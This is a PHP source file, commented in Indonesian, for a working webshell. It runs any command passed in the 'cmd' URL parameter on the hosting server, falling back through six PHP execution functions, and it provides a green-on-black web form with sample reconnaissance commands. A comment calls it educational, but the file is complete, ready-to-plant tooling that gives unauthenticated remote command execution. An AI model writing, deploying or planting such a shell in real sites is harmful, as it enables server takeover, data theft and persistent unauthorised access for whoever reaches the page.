<?php
// Simple webshell untuk eksekusi perintah
// HANYA UNTUK TUJUAN EDUKASI DAN TESTING

// Cek apakah ada parameter 'cmd'
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    echo "<pre>";
    echo "Command: " . htmlspecialchars($cmd) . "\n\n";
    echo "Output:\n";
    echo "----------------------------------------\n";
    
    // Coba berbagai fungsi eksekusi
    if (function_exists('system')) {
        system($cmd);
    } elseif (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        passthru($cmd);
    } elseif (function_exists('popen')) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            echo fread($handle, 1024);
        }
        pclose($handle);
    } elseif (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($process);
        }
    } else {
        echo "[-] Tidak ada fungsi eksekusi yang tersedia!";
    }
    
    echo "\n----------------------------------------\n";
    echo "UID: " . getmyuid() . " | User: " . get_current_user() . "\n";
    echo "</pre>";
} else {
    // Tampilkan form jika tidak ada parameter
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Webshell - Command Execution</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
            input[type="text"] { background: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 500px; }
            input[type="submit"] { background: #00ff00; color: #0a0a0a; border: none; padding: 10px 20px; cursor: pointer; }
            .container { max-width: 800px; margin: 0 auto; }
            .prompt { color: #ffaa00; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🖥️ Webshell v1.0</h1>
            <p class="prompt">User: <?php echo get_current_user(); ?> | UID: <?php echo getmyuid(); ?></p>
            <form method="GET">
                <input type="text" name="cmd" placeholder="Masukkan perintah (contoh: id)" size="50">
                <input type="submit" value="Execute">
            </form>
            <br>
            <p><b>Contoh perintah:</b><br>
            - <code>id</code> (lihat user)<br>
            - <code>whoami</code> (lihat username)<br>
            - <code>pwd</code> (lihat direktori)<br>
            - <code>ls -la</code> (lihat file)<br>
            - <code>uname -a</code> (info sistem)</p>
        </div>
    </body>
    </html>
    <?php
}
?>
